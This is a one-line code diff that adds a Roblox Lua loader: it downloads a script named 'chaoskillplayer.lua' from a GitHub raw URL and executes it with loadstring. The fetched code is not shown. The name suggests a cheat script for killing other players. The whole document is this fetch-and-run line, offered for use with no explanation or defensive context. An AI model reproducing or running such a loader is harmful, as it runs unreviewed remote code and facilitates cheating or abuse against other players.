@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alvindimas05/roblox-script/main/chaoskillplayer.lua"))()
